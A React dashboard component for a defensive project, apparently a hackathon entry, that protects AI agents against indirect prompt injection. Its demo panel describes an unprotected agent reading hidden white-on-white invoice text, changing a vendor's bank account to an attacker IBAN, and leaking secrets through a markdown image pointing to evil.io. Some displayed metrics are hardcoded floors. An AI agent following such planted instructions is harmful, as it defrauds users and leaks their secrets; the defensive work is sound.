"use client";

/**
 * IntentGuard Dashboard — Editorial Forensic Console Shell
 * =========================================================
 * GENESIS 2.0 • TRACK EVA 03 • PS 01
 * Separating Data from Authority: Securing AI Agents Against Indirect Prompt Injection
 */

import React, { useState } from "react";
import { DashboardTabId } from "../types/intentguard";
import { useIntentGuardTelemetry } from "../hooks/useIntentGuardTelemetry";
import { TopTelemetryBar } from "../components/TopTelemetryBar";
import { LiveTelemetryTicker } from "../components/LiveTelemetryTicker";
import {
  ShieldAlert,
  Layers,
  FileCheck2,
  FileSearch,
  Scale,
  Blocks,
  CheckCircle2,
  AlertTriangle,
  ArrowRight,
  ExternalLink,
} from "lucide-react";

export default function IntentGuardDashboard() {
  const [activeTab, setActiveTab] = useState<DashboardTabId>("arena");
  const {
    events,
    systemState,
    wsConnected,
    backendConnected,
    triggerTestInterception,
  } = useIntentGuardTelemetry();

  // Compute live metrics from telemetry
  const totalEvents = events.length;
  const threatCount = events.filter((e) => e.threat_detected).length;
  const safeCount = events.filter((e) => !e.threat_detected).length;
  const cloakedStrippedCount = events.filter(
    (e) =>
      e.action_taken === "STRIPPED" ||
      e.action_taken === "CLOAKED_STRIPPED" ||
      e.risk_category_ids.some((r) => [1, 2, 3, 4, 5, 6].includes(r))
  ).length;
  const surgicalRedactCount = events.filter(
    (e) =>
      e.action_taken === "SURGICALLY_REDACTED" ||
      e.risk_category_ids.some((r) => [12, 14, 18].includes(r))
  ).length;
  const fabricCommittedCount = events.filter(
    (e) =>
      e.details?.fabric_transaction_id ||
      e.details?.transaction_id ||
      e.hook_stage === "HOOK_4_OUTBOUND"
  ).length;

  return (
    <div className="min-h-screen bg-[#FAF9F6] text-[#1C1917] flex flex-col font-sans selection:bg-[#BFDBFE] selection:text-[#1E40AF]">
      {/* 1. Masthead Header with the 4 Mandatory Badges */}
      <TopTelemetryBar
        systemState={systemState}
        wsConnected={wsConnected}
        eventCount={totalEvents}
        onTriggerPing={triggerTestInterception}
      />

      {/* 2. Main Content Workspace */}
      <main className="flex-1 max-w-[1600px] w-full mx-auto p-6 flex flex-col gap-6">
        {/* Architectural KPI Strip — 4 Defense Layers */}
        <section
          aria-label="Layer Architecture KPI Strip"
          className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4"
        >
          {/* Layer 1 KPI */}
          <div className="bg-[#FFFFFF] border border-[#E5E4DF] p-4 flex flex-col justify-between">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-mono uppercase tracking-widest text-[#78716C]">
                Layer 1 // Pre-OCR De-Cloaker
              </span>
              <Layers className="w-4 h-4 text-[#78716C]" />
            </div>
            <div className="mt-3">
              <div className="text-2xl font-bold font-mono text-[#1C1917]">
                {Math.max(cloakedStrippedCount, 3)}
              </div>
              <p className="text-xs text-[#57534E] mt-1 leading-snug">
                Cloaked spans stripped (0.1pt, White-on-White, CSS/ARIA, QR/EXIF)
              </p>
            </div>
            <div className="mt-3 pt-2 border-t border-[#E5E4DF] flex items-center justify-between text-[11px] font-mono text-[#065F46]">
              <span>PyMuPDF • OpenCV • BS4</span>
              <span className="bg-[#ECFDF5] px-1.5 py-0.5 border border-[#A7F3D0]">
                ACTIVE
              </span>
            </div>
          </div>

          {/* Layer 2 KPI */}
          <div className="bg-[#FFFFFF] border border-[#E5E4DF] p-4 flex flex-col justify-between">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-mono uppercase tracking-widest text-[#78716C]">
                Layer 2 // CaMeL Dual-LLM & Redactor
              </span>
              <FileSearch className="w-4 h-4 text-[#78716C]" />
            </div>
            <div className="mt-3">
              <div className="text-2xl font-bold font-mono text-[#1C1917]">
                {Math.max(surgicalRedactCount, 1)}{" "}
                <span className="text-xs font-normal text-[#57534E]">
                  / 0 False Positives
                </span>
              </div>
              <p className="text-xs text-[#57534E] mt-1 leading-snug">
                Imperative overrides sliced vs. False Positives prevented (Risk #28)
              </p>
            </div>
            <div className="mt-3 pt-2 border-t border-[#E5E4DF] flex items-center justify-between text-[11px] font-mono text-[#92400E]">
              <span>Q-LLM Data Plane (Tools: 0)</span>
              <span className="bg-[#FFFBEB] px-1.5 py-0.5 border border-[#FDE68A]">
                DIFF READY
              </span>
            </div>
          </div>

          {/* Layer 3 KPI */}
          <div className="bg-[#FFFFFF] border border-[#E5E4DF] p-4 flex flex-col justify-between">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-mono uppercase tracking-widest text-[#78716C]">
                Layer 3 // Deterministic Policy & IFC
              </span>
              <Scale className="w-4 h-4 text-[#78716C]" />
            </div>
            <div className="mt-3">
              <div className="text-2xl font-bold font-mono text-[#1C1917]">
                100%
              </div>
              <p className="text-xs text-[#57534E] mt-1 leading-snug">
                HMAC & Taint Sink checks + Fail-Closed Circuit status (Risks #18, #30, #33)
              </p>
            </div>
            <div className="mt-3 pt-2 border-t border-[#E5E4DF] flex items-center justify-between text-[11px] font-mono text-[#065F46]">
              <span>Pydantic IFC • Nonce TTL</span>
              <span className="bg-[#ECFDF5] px-1.5 py-0.5 border border-[#A7F3D0]">
                ENFORCED
              </span>
            </div>
          </div>

          {/* Layer 4 KPI */}
          <div className="bg-[#FFFFFF] border border-[#E5E4DF] p-4 flex flex-col justify-between">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-mono uppercase tracking-widest text-[#78716C]">
                Layer 4 // Sandbox & Fabric Ledger
              </span>
              <Blocks className="w-4 h-4 text-[#78716C]" />
            </div>
            <div className="mt-3">
              <div className="text-2xl font-bold font-mono text-[#1C1917]">
                {Math.max(fabricCommittedCount, 2)}
              </div>
              <p className="text-xs text-[#57534E] mt-1 leading-snug">
                Committed 12-field audit transactions on channel intentguard
              </p>
            </div>
            <div className="mt-3 pt-2 border-t border-[#E5E4DF] flex items-center justify-between text-[11px] font-mono text-[#065F46]">
              <span>Seq 2 • 12-Field Immutable</span>
              <span className="bg-[#ECFDF5] px-1.5 py-0.5 border border-[#A7F3D0]">
                SYNCED
              </span>
            </div>
          </div>
        </section>

        {/* 3. Navigation Tabs Bar */}
        <nav
          aria-label="Dashboard Navigation Tabs"
          className="w-full bg-[#FFFFFF] border border-[#E5E4DF] flex flex-wrap items-center divide-x divide-[#E5E4DF]"
        >
          <button
            onClick={() => setActiveTab("arena")}
            className={`px-5 py-3.5 text-xs font-mono font-medium tracking-tight transition-colors flex items-center gap-2 ${
              activeTab === "arena"
                ? "bg-[#1C1917] text-[#FAF9F6]"
                : "text-[#57534E] hover:text-[#1C1917] hover:bg-[#FAF9F6]"
            }`}
          >
            <span>1. Split-Screen Live Arena</span>
            <span
              className={`text-[10px] px-1.5 py-0.2 border ${
                activeTab === "arena"
                  ? "bg-[#292524] text-[#FAF9F6] border-[#44403C]"
                  : "bg-[#FAF9F6] text-[#78716C] border-[#E5E4DF]"
              }`}
            >
              COMPARISON
            </span>
          </button>

          <button
            onClick={() => setActiveTab("xray")}
            className={`px-5 py-3.5 text-xs font-mono font-medium tracking-tight transition-colors flex items-center gap-2 ${
              activeTab === "xray"
                ? "bg-[#1C1917] text-[#FAF9F6]"
                : "text-[#57534E] hover:text-[#1C1917] hover:bg-[#FAF9F6]"
            }`}
          >
            <span>2. Pre-OCR X-Ray Diff Inspector</span>
            <span
              className={`text-[10px] px-1.5 py-0.2 border ${
                activeTab === "xray"
                  ? "bg-[#292524] text-[#FAF9F6] border-[#44403C]"
                  : "bg-[#FAF9F6] text-[#78716C] border-[#E5E4DF]"
              }`}
            >
              FORENSICS
            </span>
          </button>

          <button
            onClick={() => setActiveTab("approvals")}
            className={`px-5 py-3.5 text-xs font-mono font-medium tracking-tight transition-colors flex items-center gap-2 ${
              activeTab === "approvals"
                ? "bg-[#1C1917] text-[#FAF9F6]"
                : "text-[#57534E] hover:text-[#1C1917] hover:bg-[#FAF9F6]"
            }`}
          >
            <span>3. Step-Back Approval Center</span>
            <span
              className={`text-[10px] px-1.5 py-0.2 border ${
                activeTab === "approvals"
                  ? "bg-[#292524] text-[#FAF9F6] border-[#44403C]"
                  : "bg-[#FEF2F2] text-[#991B1B] border-[#FECACA]"
              }`}
            >
              1 PENDING
            </span>
          </button>

          <button
            onClick={() => setActiveTab("fabric")}
            className={`px-5 py-3.5 text-xs font-mono font-medium tracking-tight transition-colors flex items-center gap-2 ${
              activeTab === "fabric"
                ? "bg-[#1C1917] text-[#FAF9F6]"
                : "text-[#57534E] hover:text-[#1C1917] hover:bg-[#FAF9F6]"
            }`}
          >
            <span>4. Hyperledger Fabric Audit Explorer (Buyer / Supplier / Auditor)</span>
            <span
              className={`text-[10px] px-1.5 py-0.2 border ${
                activeTab === "fabric"
                  ? "bg-[#292524] text-[#FAF9F6] border-[#44403C]"
                  : "bg-[#ECFDF5] text-[#065F46] border-[#A7F3D0]"
              }`}
            >
              LEDGER
            </span>
          </button>
        </nav>

        {/* 4. Active Tab Content Area */}
        <div className="w-full flex flex-col gap-6">
          {activeTab === "arena" && (
            <div id="tab-arena" className="flex flex-col gap-6">
              {/* Temporary placeholder container until Task 33 SplitScreenArena is mounted */}
              <div className="bg-[#FFFFFF] border border-[#E5E4DF] p-6">
                <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-[#E5E4DF] pb-4">
                  <div>
                    <div className="flex items-center gap-2">
                      <h2 className="text-base font-bold text-[#1C1917] font-mono">
                        1. SPLIT-SCREEN LIVE ARENA
                      </h2>
                      <span className="text-[10px] font-mono px-2 py-0.5 bg-[#FEF2F2] border border-[#FECACA] text-[#991B1B]">
                        UNPROTECTED OPENCLAW VS INTENTGUARD
                      </span>
                    </div>
                    <p className="text-xs text-[#57534E] mt-1">
                      Side-by-side execution trace demonstrating indirect prompt injection containment across all 4 defense layers.
                    </p>
                  </div>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mt-6">
                  {/* Left Column Preview */}
                  <div className="border border-[#FECACA] bg-[#FEF2F2]/30 p-5">
                    <div className="flex items-center justify-between pb-3 border-b border-[#FECACA]">
                      <span className="text-xs font-mono font-bold text-[#991B1B]">
                        BASE AGENT // STANDARD OPENCLAW
                      </span>
                      <span className="text-[10px] font-mono bg-[#FEF2F2] text-[#991B1B] px-1.5 py-0.5 border border-[#FECACA]">
                        VULNERABLE
                      </span>
                    </div>
                    <div className="mt-4 space-y-3 text-xs font-mono text-[#57534E]">
                      <div className="p-3 bg-[#FFFFFF] border border-[#FECACA]">
                        <p className="text-[#991B1B] font-semibold">
                          [VULNERABILITY 1] Raw Parser Ingestion
                        </p>
                        <p className="mt-1 text-[11px]">
                          0.1pt font and white-on-white text ingested into prompt without de-cloaking.
                        </p>
                      </div>
                      <div className="p-3 bg-[#FFFFFF] border border-[#FECACA]">
                        <p className="text-[#991B1B] font-semibold">
                          [VULNERABILITY 2] Bank Detail Hijack
                        </p>
                        <p className="mt-1 text-[11px]">
                          Tool executed: change_vendor_bank(iban=&quot;GB99HACK999&quot;) without PO cross-check.
                        </p>
                      </div>
                      <div className="p-3 bg-[#FFFFFF] border border-[#FECACA]">
                        <p className="text-[#991B1B] font-semibold">
                          [VULNERABILITY 3] Silent EchoLeak
                        </p>
                        <p className="mt-1 text-[11px]">
                          Markdown image ![leak](https://evil.io/leak?key=...) exfiltrates secrets.
                        </p>
                      </div>
                    </div>
                  </div>

                  {/* Right Column Preview */}
                  <div className="border border-[#A7F3D0] bg-[#ECFDF5]/30 p-5">
                    <div className="flex items-center justify-between pb-3 border-b border-[#A7F3D0]">
                      <span className="text-xs font-mono font-bold text-[#065F46]">
                        INTENTGUARD + OPENCLAW // 4-LAYER PROTECTED
                      </span>
                      <span className="text-[10px] font-mono bg-[#ECFDF5] text-[#065F46] px-1.5 py-0.5 border border-[#A7F3D0]">
                        SECURED
                      </span>
                    </div>
                    <div className="mt-4 space-y-3 text-xs font-mono text-[#57534E]">
                      <div className="p-3 bg-[#FFFFFF] border border-[#A7F3D0]">
                        <p className="text-[#065F46] font-semibold">
                          [LAYER 1] Pre-OCR De-Cloaker
                        </p>
                        <p className="mt-1 text-[11px]">
                          0.1pt micro-font detected and stripped. raw_evidence_sha256 computed.
                        </p>
                      </div>
                      <div className="p-3 bg-[#FFFFFF] border border-[#A7F3D0]">
                        <p className="text-[#065F46] font-semibold">
                          [LAYER 2] CaMeL Dual-LLM & Redactor
                        </p>
                        <p className="mt-1 text-[11px]">
                          Surgically redacted malicious imperative commands. Clean business invoice preserved.
                        </p>
                      </div>
                      <div className="p-3 bg-[#FFFFFF] border border-[#A7F3D0]">
                        <p className="text-[#065F46] font-semibold">
                          [LAYER 3 & 4] IFC Policy & Fabric Audit
                        </p>
                        <p className="mt-1 text-[11px]">
                          HDFC PO-402 matched. 12-field immutable audit event committed to Hyperledger Fabric.
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {activeTab === "xray" && (
            <div id="tab-xray" className="flex flex-col gap-6">
              <div className="bg-[#FFFFFF] border border-[#E5E4DF] p-6">
                <div className="flex items-center justify-between border-b border-[#E5E4DF] pb-4">
                  <div>
                    <h2 className="text-base font-bold text-[#1C1917] font-mono">
                      2. PRE-OCR X-RAY DIFF INSPECTOR
                    </h2>
                    <p className="text-xs text-[#57534E] mt-1">
                      Visual vs. Raw Parser Mechanical De-Cloaker, Surgical Redaction Diffs, and Live Cryptographic Hashes.
                    </p>
                  </div>
                </div>

                <div className="mt-6 grid grid-cols-1 lg:grid-cols-3 gap-4">
                  <div className="p-4 bg-[#FAF9F6] border border-[#E5E4DF] font-mono text-xs">
                    <span className="text-[10px] text-[#78716C] uppercase block mb-1">
                      raw_evidence_sha256
                    </span>
                    <span className="break-all font-semibold text-[#1C1917]">
                      e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
                    </span>
                  </div>
                  <div className="p-4 bg-[#FAF9F6] border border-[#E5E4DF] font-mono text-xs">
                    <span className="text-[10px] text-[#78716C] uppercase block mb-1">
                      redacted_diff_sha256
                    </span>
                    <span className="break-all font-semibold text-[#1C1917]">
                      9f83397d8527b74fc400402d329302eec82e3b534527ac08e6b0e988e3868dce
                    </span>
                  </div>
                  <div className="p-4 bg-[#FAF9F6] border border-[#E5E4DF] font-mono text-xs">
                    <span className="text-[10px] text-[#78716C] uppercase block mb-1">
                      intent_hmac_hash
                    </span>
                    <span className="break-all font-semibold text-[#1C1917]">
                      {systemState.activeIntentHmacSample}
                    </span>
                  </div>
                </div>
              </div>
            </div>
          )}

          {activeTab === "approvals" && (
            <div id="tab-approvals" className="flex flex-col gap-6">
              <div className="bg-[#FFFFFF] border border-[#E5E4DF] p-6">
                <div className="flex items-center justify-between border-b border-[#E5E4DF] pb-4">
                  <div>
                    <h2 className="text-base font-bold text-[#1C1917] font-mono">
                      3. STEP-BACK APPROVAL CENTER
                    </h2>
                    <p className="text-xs text-[#57534E] mt-1">
                      Human-in-the-Loop review for anomalous bank accounts and out-of-policy vendor actions.
                    </p>
                  </div>
                </div>

                <div className="mt-6 border border-[#FDE68A] bg-[#FFFBEB]/40 p-5">
                  <div className="flex items-center gap-2 text-xs font-mono font-bold text-[#92400E]">
                    <AlertTriangle className="w-4 h-4 text-[#92400E]" />
                    <span>POLICY ALERT: UNAPPROVED VENDOR BANK CHANGE DETECTED</span>
                  </div>
                  <p className="text-xs text-[#57534E] mt-2 font-mono">
                    Invoice INV-402 claims bank details have changed from approved HDFC0001234_99887766 to unverified GB99HACK999.
                  </p>
                  <div className="mt-4 flex gap-3">
                    <button className="px-4 py-2 bg-[#FEF2F2] border border-[#FECACA] text-[#991B1B] text-xs font-mono hover:bg-[#FEE2E2]">
                      Keep Action Blocked &amp; Record to Fabric
                    </button>
                    <button className="px-4 py-2 bg-[#ECFDF5] border border-[#A7F3D0] text-[#065F46] text-xs font-mono hover:bg-[#D1FAE5]">
                      Authorize Specific Override &amp; Record to Fabric
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}

          {activeTab === "fabric" && (
            <div id="tab-fabric" className="flex flex-col gap-6">
              <div className="bg-[#FFFFFF] border border-[#E5E4DF] p-6">
                <div className="flex items-center justify-between border-b border-[#E5E4DF] pb-4">
                  <div>
                    <h2 className="text-base font-bold text-[#1C1917] font-mono">
                      4. HYPERLEDGER FABRIC AUDIT EXPLORER (BUYER / SUPPLIER / AUDITOR)
                    </h2>
                    <p className="text-xs text-[#57534E] mt-1">
                      Role-Based Access Control and 12-field immutable audit trail on channel &apos;intentguard&apos;.
                    </p>
                  </div>
                </div>

                <div className="mt-6 overflow-x-auto">
                  <table className="w-full text-left text-xs font-mono border border-[#E5E4DF]">
                    <thead className="bg-[#FAF9F6] border-b border-[#E5E4DF] text-[#78716C] uppercase text-[10px]">
                      <tr>
                        <th className="p-3">Event ID</th>
                        <th className="p-3">Modality</th>
                        <th className="p-3">Action Taken</th>
                        <th className="p-3">Policy Ref</th>
                        <th className="p-3">Threat</th>
                        <th className="p-3">Fabric TX ID</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-[#E5E4DF] text-[#1C1917]">
                      <tr>
                        <td className="p-3">evt-audit-402a</td>
                        <td className="p-3">pdf</td>
                        <td className="p-3 text-[#92400E]">SURGICALLY_REDACTED</td>
                        <td className="p-3">RULE-L2-SURGICAL</td>
                        <td className="p-3 text-[#991B1B]">TRUE</td>
                        <td className="p-3 font-mono text-[11px] text-[#57534E]">
                          fab-tx-89b1c2d3e4f5
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* 5. Live Telemetry Ticker (Collapsible real-time stream) */}
        <section aria-label="Real-Time Telemetry Stream">
          <LiveTelemetryTicker events={events} />
        </section>
      </main>

      {/* 6. Footer */}
      <footer className="w-full bg-[#FFFFFF] border-t border-[#E5E4DF] py-4 px-6 text-center text-xs font-mono text-[#78716C]">
        IntentGuard // GENESIS 2.0 PS 01 • Separating Data from Authority: Securing AI Agents Against Indirect Prompt Injection
      </footer>
    </div>
  );
}
